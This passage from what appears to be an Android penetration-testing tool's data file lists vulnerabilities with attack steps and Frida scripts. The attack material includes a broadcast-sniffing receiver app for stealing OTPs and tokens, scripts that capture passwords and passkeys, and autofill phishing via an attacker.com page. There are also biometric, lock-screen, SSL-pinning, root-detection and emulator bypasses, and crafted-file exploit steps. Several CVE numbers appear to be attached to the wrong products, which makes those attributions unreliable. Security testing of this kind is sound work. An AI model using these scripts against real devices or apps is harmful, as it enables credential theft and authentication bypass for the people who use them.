     "poc":"// Frida: intercept dynamic class loading\nJava.perform(function() {\n    var DexClassLoader = Java.use('dalvik.system.DexClassLoader');\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libPath, parent) {\n        console.log('[!] DexClassLoader loading: ' + dexPath);\n        console.log('    optimizedDir: ' + optimizedDir);\n        // Could replace dexPath with malicious DEX here\n        return this.$init(dexPath, optimizedDir, libPath, parent);\n    };\n    var PathClassLoader = Java.use('dalvik.system.PathClassLoader');\n    PathClassLoader.$init.overload('java.lang.String', 'java.lang.ClassLoader').implementation = function(path, parent) {\n        console.log('[!] PathClassLoader: ' + path);\n        return this.$init(path, parent);\n    };\n});"},
    {"vuln":"Broadcast Theft","tool":"adb, drozer, custom receiver",
     "steps":"1. Find sendBroadcast with implicit intents in code:\n   grep -rn 'sendBroadcast' output/\n2. Register receiver for the action:\n   adb shell am broadcast -a <package>.ACTION_DATA_SYNC\n3. Build sniffing app:\n   Register BroadcastReceiver for the implicit action\n   Log all extras: intent.getExtras().keySet() + values\n4. Intercept sensitive broadcasts:\n   OTP codes, auth tokens, sync data, payment confirmations",
     "poc":"// Malicious receiver app to steal implicit broadcasts\n// AndroidManifest.xml:\n// <receiver android:name=\".Sniffer\" android:exported=\"true\">\n//   <intent-filter android:priority=\"999\">\n//     <action android:name=\"com.target.DATA_SYNC\"/>\n//     <action android:name=\"com.target.OTP_RECEIVED\"/>\n//     <action android:name=\"com.target.PAYMENT_COMPLETE\"/>\n//   </intent-filter>\n// </receiver>\n\npublic class Sniffer extends BroadcastReceiver {\n    public void onReceive(Context ctx, Intent intent) {\n        Log.d(\"STOLEN\", \"Action: \" + intent.getAction());\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            for (String key : extras.keySet()) {\n                Log.d(\"STOLEN\", key + \" = \" + extras.get(key));\n            }\n        }\n        // Forward to attacker server\n        // new Thread(() -> sendToServer(extras)).start();\n    }\n}"},
    {"vuln":"Insecure SharedPreferences","tool":"adb (root), Frida",
     "steps":"1. On rooted device, read world-readable prefs:\n   adb shell cat /data/data/<pkg>/shared_prefs/*.xml\n2. Check file permissions:\n   adb shell ls -la /data/data/<pkg>/shared_prefs/\n   MODE_WORLD_READABLE = -rw-rw-r-- (readable by any app)\n3. From any app on device:\n   open(\"/data/data/<pkg>/shared_prefs/auth.xml\").read()\n4. Extract tokens/passwords stored in plaintext",
     "poc":"// Frida: dump all SharedPreferences at runtime\nJava.perform(function() {\n    var SP = Java.use('android.app.SharedPreferencesImpl');\n    SP.getString.overload('java.lang.String', 'java.lang.String').implementation = function(key, defValue) {\n        var value = this.getString(key, defValue);\n        if (/token|password|secret|session|auth|key/i.test(key)) {\n            console.log('[SENSITIVE-PREF] ' + key + ' = ' + value);\n        }\n        return value;\n    };\n    // Dump entire prefs file\n    var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();\n    var prefsDir = ctx.getFilesDir().getParent() + '/shared_prefs/';\n    var files = Java.use('java.io.File').$new(prefsDir).listFiles();\n    if (files) {\n        for (var i = 0; i < files.length; i++) {\n            console.log('[PREFS-FILE] ' + files[i].getName());\n        }\n    }\n});"},
    {"vuln":"Clipboard Leak","tool":"Frida, adb",
     "steps":"1. Monitor clipboard in real-time:\n   adb shell service call clipboard 2 s16 com.android.shell\n2. Frida hook to capture all clipboard writes:\n   Hook ClipboardManager.setPrimaryClip\n3. Any app can read clipboard (pre-Android 10)\n4. If app copies passwords/tokens to clipboard,\n   a background malicious app steals them instantly",
      "poc":"// Frida: clipboard theft monitor\nJava.perform(function() {\n    var CM = Java.use('android.content.ClipboardManager');\n    CM.setPrimaryClip.implementation = function(clip) {\n        var text = clip.getItemAt(0).getText();\n        console.log('[CLIPBOARD-WRITE] ' + text);\n        this.setPrimaryClip(clip);\n    };\n    CM.getPrimaryClip.implementation = function() {\n        var clip = this.getPrimaryClip();\n        if (clip && clip.getItemCount() > 0) {\n            console.log('[CLIPBOARD-READ] ' + clip.getItemAt(0).getText());\n        }\n        return clip;\n    };\n    console.log('[*] Clipboard monitoring active');\n});"},
    {"vuln":"Native Library","tool":"Frida, gdb, radare2","cves":["CVE-2023-4863","CVE-2025-27363","CVE-2024-49415","CVE-2024-53104"],
     "steps":"[CVE-2023-4863 libwebp + CVE-2024-49415 Samsung Zero-Click + CVE-2025-27363 FreeType] Native library exploitation:\n\n1. CVE-2023-4863 libwebp Heap Overflow (Chrome/WebView RCE):\n   # ANY app rendering WebP images is vulnerable\n   # Craft malicious WebP with oversized Huffman table:\n   python3 craft_webp.py  # generates exploit.webp\n   adb push exploit.webp /sdcard/\n   adb shell am start -d file:///sdcard/exploit.webp\n   # Triggers heap overflow in BuildHuffmanTable\n   # Code execution in renderer process\n\n2. CVE-2024-49415 Samsung Zero-Click Audio RCE:\n   # NO user interaction needed - just send RCS message!\n   # Samsung's libSaped.so overflows decoding APE audio\n   python3 craft_ape.py  # generates exploit.ape\n   # Send via RCS to Samsung target phone number\n   # When phone receives RCS, media transcoder processes APE\n   # Heap overflow -> code execution in mediacodec process\n\n3. CVE-2025-27363 FreeType Font RCE:\n   # Craft malicious TrueType font:\n   python3 craft_ttf.py  # generates exploit.ttf\n   # Serve on web page: @font-face { src: url('exploit.ttf'); }\n   # Any WebView/Chrome rendering the font triggers OOB write\n\n4. Identify native libs in APK:\n   unzip -l target.apk | grep '\\.so$'\n   readelf -d lib/arm64-v8a/*.so | grep NEEDED\n\n5. Frida native function hooking:\n   frida -U -f <package> -l native_hook.js",
     "poc":"// Frida: hook native library functions for exploitation\nJava.perform(function() {\n    // Monitor System.loadLibrary\n    var System = Java.use('java.lang.System');\n    System.loadLibrary.implementation = function(name) {\n        console.log('[NATIVE] Loading: lib' + name + '.so');\n        this.loadLibrary(name);\n        // After loading, hook native functions\n        try {\n            var base = Module.findBaseAddress('lib' + name + '.so');\n            if (base) {\n                console.log('[NATIVE] Base: ' + base);\n                // Hook common vulnerable functions\n                var funcs = ['malloc', 'free', 'memcpy', 'strcpy', 'sprintf'];\n                funcs.forEach(function(f) {\n                    try {\n                        Interceptor.attach(Module.findExportByName('lib' + name + '.so', f), {\n                            onEnter: function(args) {\n                                if (f === 'memcpy' || f === 'strcpy') {\n                                    console.log('[' + f + '] dst=' + args[0] + ' src=' + args[1]);\n                                }\n                            }\n                        });\n                    } catch(e) {}\n                });\n            }\n        } catch(e) { console.log('[!] Hook failed: ' + e); }\n    };\n});\n\n// Native heap spray for exploitation:\n// Interceptor.attach(Module.findExportByName(null, 'malloc'), {\n//     onLeave: function(retval) {\n//         Memory.writeByteArray(retval, [0x41,0x41,0x41,0x41]);\n//     }\n// });"},
    {"vuln":"Weak Biometric","tool":"Frida, adb","cves":["CVE-2025-26633"],
     "steps":"[CVE-2025-26633 Lock Screen Bypass + Biometric Bypass] Authentication bypass techniques:\n\n1. CVE-2025-26633 Lock Screen Race Condition:\n   # Physical access exploit - bypasses lock screen entirely:\n   adb shell input keyevent KEYCODE_POWER  # wake device\n   adb shell input swipe 500 1800 500 800  # swipe up\n   adb shell input tap 540 2200  # emergency call\n   adb shell input keyevent KEYCODE_BACK  # back (race window)\n   adb shell input swipe 500 1800 500 800  # swipe up immediately\n   # If Launcher appears -> bypass successful!\n\n2. Biometric Bypass (no CryptoObject):\n   # If BiometricPrompt used WITHOUT CryptoObject:\n   frida -U -f <package> -l biometric_bypass.js\n   # Directly calls onAuthenticationSucceeded callback\n\n3. ADB fingerprint emulation:\n   adb -e emu finger touch 1  # emulator fingerprint\n\n4. Frida: bypass FingerprintManager entirely:\n   Java.perform(function() {\n     var Bio = Java.use('androidx.biometric.BiometricPrompt');\n     Bio.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo')\n       .implementation = function(info) {\n         // Call success directly - no biometric needed\n         this.mAuthenticationCallback.value\n           .onAuthenticationSucceeded(\n             Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult').$new(null));\n       };\n   });\n\n5. Check if CryptoObject is bound (secure implementation):\n   grep -rn 'CryptoObject\\|setDeviceCredentialAllowed\\|setAllowedAuthenticators' output/",
     "poc":"// Frida: complete biometric authentication bypass\nJava.perform(function() {\n    // Method 1: BiometricPrompt bypass\n    try {\n        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');\n        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {\n            console.log('[BIOMETRIC-BYPASS] Intercepted authenticate()');\n            var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');\n            var result = AuthResult.$new(null);  // null CryptoObject = no crypto binding\n            this.mAuthenticationCallback.value.onAuthenticationSucceeded(result);\n            console.log('[+] Authentication bypassed - onAuthenticationSucceeded called');\n        };\n        console.log('[*] BiometricPrompt bypass installed');\n    } catch(e) { console.log('[!] BiometricPrompt not found: ' + e); }\n\n    // Method 2: FingerprintManager bypass (legacy)\n    try {\n        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');\n        FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {\n            console.log('[FINGERPRINT-BYPASS] Legacy FingerprintManager intercepted');\n            var AuthResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');\n            callback.onAuthenticationSucceeded(AuthResult.$new(null, null));\n        };\n        console.log('[*] FingerprintManager bypass installed');\n    } catch(e) {}\n\n    // Method 3: KeyguardManager bypass\n    try {\n        var KM = Java.use('android.app.KeyguardManager');\n        KM.isDeviceLocked.implementation = function() { return false; };\n        KM.isKeyguardLocked.implementation = function() { return false; };\n        KM.isKeyguardSecure.implementation = function() { return false; };\n        console.log('[*] KeyguardManager bypass installed');\n    } catch(e) {}\n});"},
    {"vuln":"Malware Pattern","tool":"adb, Frida, VirusTotal","cves":["CVE-2024-49415","CVE-2020-0069"],
     "steps":"[CVE-2024-49415 Zero-Click + CVE-2020-0069 MediaTek-SU] Malware capability analysis:\n\n1. Check for zero-click attack surface (CVE-2024-49415 pattern):\n   # If app has media processing permissions:\n   grep -rn 'MediaCodec\\|AudioDecoder\\|BitmapFactory\\|ImageDecoder' output/\n   # Vulnerable if: processes untrusted media without sandboxing\n\n2. Check for SMS/Device Admin abuse:\n   grep -rn 'SmsManager\\.send\\|DeviceAdminReceiver\\|AccessibilityService' output/\n   # SmsManager.send -> premium SMS fraud\n   # DeviceAdminReceiver -> ransomware/wiper\n   # AccessibilityService -> keylogger/credential theft\n\n3. CVE-2020-0069 MediaTek persistence:\n   # If app targets MediaTek devices, check for /proc/mtk_cmdq access\n   grep -rn 'mtk_cmdq\\|/proc/mtk\\|ioctl' output/\n\n4. Dynamic analysis with Frida:\n   frida -U -f <package> -l malware_monitor.js\n   # Monitor: file writes, network connections, SMS sends\n\n5. Check VirusTotal:\n   sha256=$(sha256sum target.apk | awk '{print $1}')\n   curl 'https://www.virustotal.com/api/v3/files/$sha256' -H 'x-apikey: YOUR_KEY'",
     "poc":"// Frida: comprehensive malware behavior monitor\nJava.perform(function() {\n    // Monitor SMS sending\n    var SmsManager = Java.use('android.telephony.SmsManager');\n    SmsManager.sendTextMessage.overload('java.lang.String','java.lang.String','java.lang.String','android.app.PendingIntent','android.app.PendingIntent').implementation = function(dest,sc,text,sentI,delI) {\n        console.log('[!!! SMS] To: ' + dest + ' Body: ' + text);\n        // Block premium SMS:\n        // if (dest.startsWith('+44') || dest.length <= 5) return;\n        this.sendTextMessage(dest,sc,text,sentI,delI);\n    };\n    // Monitor file operations\n    var FileOutputStream = Java.use('java.io.FileOutputStream');\n    FileOutputStream.$init.overload('java.io.File').implementation = function(f) {\n        var path = f.getAbsolutePath();\n        if (/shared_prefs|databases|keystore|passwd|shadow/i.test(path)) {\n            console.log('[!!! FILE-WRITE] ' + path);\n        }\n        return this.$init(f);\n    };\n    // Monitor network connections\n    var URL = Java.use('java.net.URL');\n    URL.openConnection.implementation = function() {\n        console.log('[NET] ' + this.toString());\n        return this.openConnection();\n    };\n    // Monitor device admin\n    try {\n        var DeviceAdmin = Java.use('android.app.admin.DevicePolicyManager');\n        DeviceAdmin.lockNow.implementation = function() {\n            console.log('[!!! RANSOMWARE] lockNow() called!');\n        };\n        DeviceAdmin.wipeData.implementation = function(flags) {\n            console.log('[!!! WIPER] wipeData() BLOCKED!');\n            // Block wipe to prevent data destruction\n        };\n    } catch(e) {}\n    console.log('[*] Malware behavior monitor active');\n});"},
    {"vuln":"Accessibility Service","tool":"Frida, adb, drozer","cves":["CVE-2024-43093","CVE-2023-20963"],
     "steps":"[CVE-2024-43093 + Accessibility Keylogging] Full accessibility exploitation chain:\n\n1. Confirm AccessibilityService in manifest:\n   aapt dump xmltree target.apk AndroidManifest.xml | grep -A5 'AccessibilityService'\n   grep -rn 'onAccessibilityEvent\\|AccessibilityNodeInfo' output/\n\n2. Check what events it captures:\n   grep -rn 'typeViewTextChanged\\|typeViewFocused\\|typeWindowContentChanged' output/\n   # typeViewTextChanged + getText() = KEYLOGGER\n   # typeWindowContentChanged + source.getClassName() = SCREEN READER\n\n3. Simulate AccessibilityService data exfiltration with Frida:\n   frida -U -f <package> -e '\n   Java.perform(function(){\n     var ANSI = Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n     ANSI.getText.implementation = function(){\n       var text = this.getText();\n       if(text) console.log(\"[A11Y-CAPTURE] \" + text.toString());\n       return text;\n     };\n   });'\n\n4. Check data exfiltration endpoint:\n   grep -rn 'http\\|socket\\|firebase\\|sendBroadcast' output/ | grep -i 'accessibility\\|a11y\\|event'\n   # If accessibility data flows to network -> SPYWARE\n\n5. Enumerate accessible content from other apps:\n   adb shell settings get secure enabled_accessibility_services\n   adb shell dumpsys accessibility | grep 'Service\\|package'\n\n6. Weaponize: auto-click through security prompts:\n   # With accessibility, attacker can:\n   # - Click 'Allow' on permission dialogs\n   # - Enter text into password fields\n   # - Navigate to Settings and enable ADB\n   # - Install APKs from unknown sources\n   # - Read all OTP codes as they appear",
     "poc":"// Frida: intercept all AccessibilityService data capture\nJava.perform(function() {\n    var AccessibilityService = Java.use('android.accessibilityservice.AccessibilityService');\n    var AccessibilityEvent = Java.use('android.view.accessibility.AccessibilityEvent');\n    \n    // Hook onAccessibilityEvent to see what the app captures\n    AccessibilityService.onAccessibilityEvent.implementation = function(event) {\n        var eventType = event.getEventType();\n        var pkg = event.getPackageName();\n        var text = event.getText();\n        \n        // Log what the service sees\n        console.log('[A11Y-EVENT] type=' + eventType + ' pkg=' + pkg);\n        if (text && text.size() > 0) {\n            for (var i = 0; i < text.size(); i++) {\n                var t = text.get(i);\n                if (t) console.log('[A11Y-TEXT] ' + t.toString());\n            }\n        }\n        \n        // Check if it's reading from banking/auth apps\n        var sensitive = /bank|pay|auth|login|otp|password|pin|wallet/i;\n        if (pkg && sensitive.test(pkg.toString())) {\n            console.log('[!!! SPYWARE] Reading from sensitive app: ' + pkg);\n        }\n        \n        // Check if app traverses node tree (full screen reader)\n        var source = event.getSource();\n        if (source) {\n            console.log('[A11Y-NODE] class=' + source.getClassName() + \n                        ' text=' + source.getText() +\n                        ' content=' + source.getContentDescription());\n        }\n        \n        this.onAccessibilityEvent(event);\n    };\n    console.log('[*] AccessibilityService monitor active — watch for credential theft');\n});"},
    {"vuln":"Credential Manager","tool":"Frida, adb, custom phishing app","cves":["CVE-2024-43093"],
     "steps":"[Credential Manager Phishing] Exploit credential autofill to steal passwords:\n\n1. Identify Credential Manager usage:\n   grep -rn 'CredentialManager\\|GetCredentialRequest\\|CreatePasswordRequest\\|GetPasswordOption' output/\n   grep -rn 'CreatePublicKeyCredentialRequest\\|GetPublicKeyCredentialOption' output/\n\n2. Check Digital Asset Links validation:\n   grep -rn 'assetlinks.json\\|getCallingPackage\\|validateOrigin' output/\n   # If missing -> phishing possible\n\n3. Build attacker WebView that mimics login:\n   adb shell am start -n <package>/.WebViewActivity \\\n     --es url 'https://attacker.com/fake-login.html'\n   # Credential Manager may autofill passwords into attacker page\n\n4. Hook credential retrieval with Frida:\n   frida -U -f <package> -e '\n   Java.perform(function(){\n     var CredentialManager = Java.use(\"androidx.credentials.CredentialManager\");\n     // Hook getCredential result\n     var PasswordCredential = Java.use(\"androidx.credentials.PasswordCredential\");\n     PasswordCredential.getPassword.implementation = function(){\n       var pw = this.getPassword();\n       console.log(\"[CREDENTIAL-STEAL] Password: \" + pw);\n       return pw;\n     };\n   });'\n\n5. If app uses passkeys (FIDO2), check origin binding:\n   # Passkeys with correct origin are harder to phish\n   # But if app accepts any RP ID -> phishing via crafted challenge",
     "poc":"// Frida: intercept all credential manager operations\nJava.perform(function() {\n    // Hook password credential retrieval\n    try {\n        var PasswordCredential = Java.use('androidx.credentials.PasswordCredential');\n        PasswordCredential.getPassword.implementation = function() {\n            var pwd = this.getPassword();\n            console.log('[!!! CREDENTIAL] Password captured: ' + pwd);\n            console.log('[!!! CREDENTIAL] ID: ' + this.getId());\n            return pwd;\n        };\n    } catch(e) { console.log('PasswordCredential not found'); }\n\n    // Hook credential request creation\n    try {\n        var GetCredentialRequest = Java.use('androidx.credentials.GetCredentialRequest');\n        GetCredentialRequest.$init.implementation = function() {\n            console.log('[CRED-REQUEST] New credential request created');\n            console.log('[CRED-REQUEST] Stack: ' + Java.use('android.util.Log').getStackTraceString(\n                Java.use('java.lang.Exception').$new()));\n            return this.$init.apply(this, arguments);\n        };\n    } catch(e) {}\n\n    // Hook public key (passkey) credential\n    try {\n        var PublicKeyCredential = Java.use('androidx.credentials.PublicKeyCredential');\n        PublicKeyCredential.getAuthenticationResponseJson.implementation = function() {\n            var json = this.getAuthenticationResponseJson();\n            console.log('[!!! PASSKEY] Auth response: ' + json);\n            return json;\n        };\n    } catch(e) {}\n    console.log('[*] Credential Manager hooks active');\n});"},
    {"vuln":"VPN Service","tool":"Frida, mitmproxy, tcpdump","cves":["CVE-2024-36971","CVE-2025-22457"],
     "steps":"[VPN Traffic Interception] Exploit VpnService for full network surveillance:\n\n1. Identify VPN implementation:\n   grep -rn 'VpnService\\|establish()\\|Builder.*addAddress\\|tun' output/\n   aapt dump xmltree target.apk AndroidManifest.xml | grep -B2 -A5 'VpnService'\n\n2. Check if VPN logs or forwards traffic:\n   grep -rn 'FileOutputStream\\|DataOutputStream\\|socket\\|http' output/ | grep -i vpn\n   grep -rn 'PacketCapture\\|tcpdump\\|pcap' output/\n\n3. Install app and grant VPN permission:\n   adb shell cmd appops set <package> ACTIVATE_VPN allow\n   adb shell am start -n <package>/.VpnActivity\n\n4. Monitor what VPN captures:\n   frida -U -f <package> -e '\n   Java.perform(function(){\n     var FileOutputStream = Java.use(\"java.io.FileOutputStream\");\n     FileOutputStream.write.overload(\"[B\",\"int\",\"int\").implementation = function(b,off,len){\n       var path = this.getFD ? \"fd\" : \"unknown\";\n       if(len > 100){\n         var data = Java.array(\"byte\", b);\n         var str = \"\";\n         for(var i=off; i<Math.min(off+50,len); i++) str += String.fromCharCode(data[i]&0xFF);\n         if(/HTTP|GET|POST|Host:|Cookie:|Authorization:/i.test(str))\n           console.log(\"[VPN-INTERCEPT] \" + str);\n       }\n       this.write(b,off,len);\n     };\n   });'\n\n5. If VPN sends traffic to remote server:\n   # This is effectively a man-in-the-middle attack on ALL device traffic\n   # Check destination IPs of VPN tunnel:\n   adb shell netstat -tn | grep $(adb shell pidof <package>)\n   # If traffic goes to sketchy IPs -> MALWARE/SURVEILLANCE",
     "poc":"// Frida: monitor VPN service data flow\nJava.perform(function() {\n    // Hook VpnService.establish() to see tunnel configuration\n    var VpnService = Java.use('android.net.VpnService');\n    var Builder = Java.use('android.net.VpnService$Builder');\n    \n    Builder.establish.implementation = function() {\n        console.log('[VPN] Tunnel established!');\n        console.log('[VPN] Stack: ' + Java.use('android.util.Log').getStackTraceString(\n            Java.use('java.lang.Exception').$new()));\n        return this.establish();\n    };\n    \n    Builder.addAddress.overload('java.lang.String', 'int').implementation = function(addr, prefix) {\n        console.log('[VPN-CONFIG] Address: ' + addr + '/' + prefix);\n        return this.addAddress(addr, prefix);\n    };\n    \n    Builder.addRoute.overload('java.lang.String', 'int').implementation = function(addr, prefix) {\n        console.log('[VPN-CONFIG] Route: ' + addr + '/' + prefix);\n        if (addr === '0.0.0.0' && prefix === 0) {\n            console.log('[!!! VPN] CAPTURES ALL TRAFFIC (0.0.0.0/0)');\n        }\n        return this.addRoute(addr, prefix);\n    };\n    \n    Builder.addDnsServer.overload('java.lang.String').implementation = function(dns) {\n        console.log('[VPN-CONFIG] DNS: ' + dns);\n        console.log('[!!! VPN] Custom DNS = can see all DNS queries');\n        return this.addDnsServer(dns);\n    };\n    \n    // Monitor file descriptor reads (actual traffic interception)\n    var FileInputStream = Java.use('java.io.FileInputStream');\n    FileInputStream.read.overload('[B').implementation = function(buf) {\n        var n = this.read(buf);\n        if (n > 40) {\n            // Check for HTTP traffic in VPN tunnel\n            var snippet = '';\n            for (var i = 0; i < Math.min(n, 80); i++) snippet += String.fromCharCode(buf[i] & 0xFF);\n            if (/GET |POST |HTTP|Host:|Cookie:|Bearer|Authorization/i.test(snippet)) {\n                console.log('[!!! VPN-DATA] ' + snippet.substring(0, 200));\n            }\n        }\n        return n;\n    };\n    console.log('[*] VPN traffic monitor active');\n});"},
    {"vuln":"Notification Listener","tool":"Frida, adb","cves":["CVE-2024-43093","CVE-2023-20963"],
     "steps":"[NotificationListenerService Exploitation] Harvest OTP/credentials from all notifications:\n\n1. Identify notification listener:\n   grep -rn 'NotificationListenerService\\|onNotificationPosted\\|StatusBarNotification' output/\n   aapt dump xmltree target.apk AndroidManifest.xml | grep -A5 'NotificationListenerService'\n\n2. Check what data is captured:\n   grep -rn 'getExtras\\|getText\\|getBigText\\|getTitle\\|EXTRA_TEXT\\|EXTRA_BIG_TEXT' output/\n   grep -rn 'send\\|post\\|upload\\|http\\|firebase' output/ | grep -i notif\n\n3. Grant notification access programmatically:\n   adb shell cmd notification allow_listener <package>/.NotifService\n   # Or: Settings > Apps > Special access > Notification access\n\n4. Monitor captured notifications:\n   frida -U -f <package> -e '\n   Java.perform(function(){\n     var NLS = Java.use(\"android.service.notification.NotificationListenerService\");\n     NLS.onNotificationPosted.overload(\"android.service.notification.StatusBarNotification\")\n       .implementation = function(sbn){\n         var pkg = sbn.getPackageName();\n         var notif = sbn.getNotification();\n         var extras = notif.extras;\n         var title = extras.getString(\"android.title\");\n         var text = extras.getCharSequence(\"android.text\");\n         console.log(\"[NOTIFICATION] from=\" + pkg + \" title=\" + title + \" text=\" + text);\n         // Check for OTP patterns\n         if(text && /\\\\b\\\\d{4,8}\\\\b|OTP|code|verify/i.test(text.toString()))\n           console.log(\"[!!! OTP STOLEN] \" + text);\n         this.onNotificationPosted(sbn);\n       };\n   });'\n\n5. Impact assessment:\n   # NotificationListener can capture:\n   # - Banking OTP/2FA codes\n   # - WhatsApp/Signal message previews\n   # - Email subjects and snippets\n   # - Password reset links\n   # - All push notifications system-wide",
     "poc":"// Frida: intercept NotificationListenerService data theft\nJava.perform(function() {\n    var NLS = Java.use('android.service.notification.NotificationListenerService');\n    NLS.onNotificationPosted.overload('android.service.notification.StatusBarNotification').implementation = function(sbn) {\n        var pkg = sbn.getPackageName();\n        var n = sbn.getNotification();\n        var extras = n.extras;\n        var title = extras.getString('android.title') || '';\n        var text = extras.getCharSequence('android.text');\n        var bigText = extras.getCharSequence('android.bigText');\n        \n        console.log('\\n[NOTIFICATION-CAPTURE]');\n        console.log('  From: ' + pkg);\n        console.log('  Title: ' + title);\n        console.log('  Text: ' + (text ? text.toString() : ''));\n        if (bigText) console.log('  BigText: ' + bigText.toString());\n        \n        // Detect OTP/credential theft\n        var content = (title + ' ' + (text||'') + ' ' + (bigText||'')).toString();\n        if (/\\d{4,8}/.test(content) && /OTP|code|verify|confirm|token/i.test(content)) {\n            console.log('  [!!! OTP STOLEN] ' + content.match(/\\d{4,8}/)[0]);\n        }\n        if (/password|reset|credential|secret/i.test(content)) {\n            console.log('  [!!! CREDENTIAL LEAK] Sensitive notification captured');\n        }\n        \n        // Check for banking apps\n        if (/bank|pay|wallet|finance|trading/i.test(pkg.toString())) {\n            console.log('  [!!! FINANCIAL] Banking notification intercepted');\n        }\n        \n        this.onNotificationPosted(sbn);\n    };\n    console.log('[*] Notification interception monitor active');\n    console.log('[*] All OTP codes and messages will be captured');\n});"},
]

# ============================================================
#  BYPASS TECHNIQUES  (mapped to scanner findings)
# ============================================================
BYPASS_TECHNIQUES = [
    {"name":"SSL Pinning Bypass","category":"Network",
     "desc":"Bypass OkHttp/custom certificate pinning to intercept HTTPS.",
     "methods":"# Method 1: Frida + objection (universal, works on most apps)\nobjection -g <package> explore\n> android sslpinning disable\n\n# Method 2: Frida script for OkHttp3 CertificatePinner\nJava.perform(function() {\n    var CertPinner = Java.use('okhttp3.CertificatePinner');\n    CertPinner.check.overload('java.lang.String','java.util.List').implementation = function(host, certs) {\n        console.log('[BYPASS] SSL pin check skipped for: ' + host);\n    };\n    // Also bypass TrustManagerImpl\n    var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n    TMI.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log('[BYPASS] TrustManager chain verification skipped for: ' + host);\n        return untrustedChain;\n    };\n});\n\n# Method 3: Patch APK\napktool d target.apk\n# Edit res/xml/network_security_config.xml:\n# <trust-anchors><certificates src=\"user\"/></trust-anchors>\napktool b target -o patched.apk\njarsigner -keystore debug.keystore patched.apk androiddebugkey\n\n# Method 4: Magisk module\n# Install MagiskTrustUserCerts module\n# Moves user CA certs to system trust store"},
    {"name":"Root Detection Bypass","category":"Resilience",
     "desc":"Bypass SafetyNet/Play Integrity and custom root checks.",
     "methods":"# Method 1: Frida universal root bypass\nJava.perform(function() {\n    // Hook common root check methods\n    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');\n    RootBeer.isRooted.implementation = function() { return false; };\n    RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() { return false; };\n    \n    // Hook file existence checks\n    var File = Java.use('java.io.File');\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (/su$|magisk|supersu|busybox/i.test(path)) {\n            console.log('[ROOT-BYPASS] Hiding: ' + path);\n            return false;\n        }\n        return this.exists();\n    };\n    \n    // Hook Runtime.exec for 'which su'\n    var Runtime = Java.use('java.lang.Runtime');\n    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n        if (/which su|su -c/i.test(cmd)) {\n            console.log('[ROOT-BYPASS] Blocked: ' + cmd);\n            throw Java.use('java.io.IOException').$new('Permission denied');\n        }\n        return this.exec(cmd);\n    };\n    \n    // Hook Build.TAGS\n    var Build = Java.use('android.os.Build');\n    Build.TAGS.value = 'release-keys';\n});\n\n# Method 2: Magisk DenyList (formerly MagiskHide)\n# Settings > Magisk > DenyList > Enable > Add target app\n\n# Method 3: Shamiko (Magisk module for Zygisk)\n# Hides root from apps using DenyList"},
    {"name":"Biometric Authentication Bypass","category":"Auth",
     "desc":"Bypass fingerprint/face auth when CryptoObject is not bound.",
     "methods":"# If BiometricPrompt is used WITHOUT CryptoObject, authentication\n# result is purely boolean — trivially bypassable:\n\nJava.perform(function() {\n    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');\n    var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');\n    \n    // Find the callback and call onAuthenticationSucceeded directly\n    var callback = null;\n    BiometricPrompt.authenticate.overload(\n        'androidx.biometric.BiometricPrompt$PromptInfo'\n    ).implementation = function(info) {\n        console.log('[BIOMETRIC-BYPASS] Intercepted authenticate()');\n        // Trigger success callback without actual biometric\n        var result = AuthResult.$new(null); // null CryptoObject = no crypto binding\n        this.mAuthenticationCallback.value.onAuthenticationSucceeded(result);\n    };\n});\n\n# Method 2: objection\nobjection -g <package> explore\n> android hooking watch class androidx.biometric.BiometricPrompt\n\n# Method 3: ADB emulator fingerprint\nadb -e emu finger touch 1"},
    {"name":"Emulator Detection Bypass","category":"Resilience",
     "desc":"Run app on emulator despite anti-emulator checks.",
     "methods":"# Frida: spoof all emulator indicators\nJava.perform(function() {\n    var Build = Java.use('android.os.Build');\n    Build.FINGERPRINT.value = 'google/sailfish/sailfish:8.1.0/OPM1.171019.011/4448085:user/release-keys';\n    Build.MODEL.value = 'Pixel';\n    Build.MANUFACTURER.value = 'Google';\n    Build.BRAND.value = 'google';\n    Build.DEVICE.value = 'sailfish';\n    Build.PRODUCT.value = 'sailfish';\n    Build.HARDWARE.value = 'sailfish';\n    Build.BOARD.value = 'sailfish';\n    Build.HOST.value = 'wphr1.hot.corp.google.com';\n    \n    // Hide /dev/goldfish and /dev/qemu pipes\n    var File = Java.use('java.io.File');\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (/goldfish|qemu|nox|genymotion|vbox/i.test(path)) return false;\n        return this.exists();\n    };\n    \n    // Spoof telephony\n    var TelMgr = Java.use('android.telephony.TelephonyManager');\n    TelMgr.getDeviceId.implementation = function() { return '352099001761481'; };\n    TelMgr.getSubscriberId.implementation = function() { return '310260000000000'; };\n    TelMgr.getSimSerialNumber.implementation = function() { return '89014103211118510720'; };\n});"},
    {"name":"Debugger Detection Bypass","category":"Resilience",
     "desc":"Attach debugger/Frida despite anti-debug and anti-tamper.",
